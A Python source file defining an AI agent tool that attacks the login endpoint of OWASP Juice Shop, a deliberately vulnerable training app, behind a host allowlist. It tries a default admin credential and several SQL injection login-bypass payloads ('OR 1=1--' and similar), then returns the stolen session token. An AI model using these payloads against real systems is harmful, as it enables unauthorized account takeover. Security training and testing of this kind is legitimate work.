from __future__ import annotations

import json
from urllib.parse import urlparse

import requests

from agent.tools.base import Tool


# Known Juice Shop seed accounts (public/well-documented default data) plus
# classic SQLi login-bypass payloads. This is intentionally short — the goal
# is a handful of high-probability vectors, not a brute-force matrix.
DEFAULT_VECTORS = [
    # discovered/known-good creds should go first if you have them, e.g.:
    {"email": "admin@juice-sh.op", "password": "admin123", "kind": "known_seed"},
    # SQLi login bypass — logs in as first user in DB regardless of password
    {"email": "' OR 1=1--", "password": "x", "kind": "sqli_bypass"},
    {"email": "' OR '1'='1", "password": "x", "kind": "sqli_bypass"},
    {"email": "admin@juice-sh.op'--", "password": "x", "kind": "sqli_targeted"},
]


class LoginVectorTool(Tool):
    """
    Tries a short, prioritized list of login vectors (known seed creds first,
    then SQLi bypass payloads) against /rest/user/login sequentially, and
    stops at the first success. Deliberately not a brute-force credential
    sprayer — Juice Shop's login is meant to be beaten with SQLi, not guessing.
    """

    def __init__(self, allowed_hosts: list[str]):
        self.name = "login_vector_attempt"
        self.description = (
            "Try a short prioritized list of login vectors (known Juice Shop "
            "seed credentials, then SQL injection bypass payloads) against "
            "/rest/user/login. Stops at the first success and returns the "
            "token. Use this instead of manually guessing individual "
            "email/password combinations."
        )
        self.allowed_hosts = {h.lower() for h in allowed_hosts}
        self.parameters = {
            "url": {"type": "string", "description": "Login endpoint, e.g. http://localhost:3000/rest/user/login"},
            "vectors": {
                "type": "array",
                "description": "Optional override list of {email, password} to try instead of the default set.",
            },
        }

    def _is_allowed(self, url: str) -> bool:
        host = urlparse(url).hostname
        return host is not None and host.lower() in self.allowed_hosts

    def execute(self, **kwargs) -> dict:
        url = kwargs.get("url")
        vectors = kwargs.get("vectors") or DEFAULT_VECTORS

        if not url:
            return {"success": False, "output": "", "error": "url is required."}
        if not self._is_allowed(url):
            return {"success": False, "output": "", "error": f"URL host is not allowed: {url}"}

        attempts = []
        for vector in vectors:
            email = vector.get("email")
            password = vector.get("password")
            kind = vector.get("kind", "custom")
            try:
                resp = requests.post(
                    url,
                    json={"email": email, "password": password},
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
            except Exception as exc:
                attempts.append({"email": email, "kind": kind, "status_code": None, "error": str(exc)})
                continue

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    token = data.get("authentication", {}).get("token")
                except Exception:
                    token = None

                return {
                    "success": True,
                    "output": json.dumps({
                        "matched_vector": {"email": email, "kind": kind},
                        "token": token,
                        "attempts_tried": len(attempts) + 1,
                    }),
                    "token": token,
                    "matched_email": email,
                    "matched_kind": kind,
                    "attempts_tried": len(attempts) + 1,
                    "error": None,
                }

            attempts.append({"email": email, "kind": kind, "status_code": resp.status_code})

        return {
            "success": False,
            "output": json.dumps({"attempts": attempts}),
            "attempts_tried": len(attempts),
            "error": f"No vector succeeded after {len(attempts)} attempts.",
        }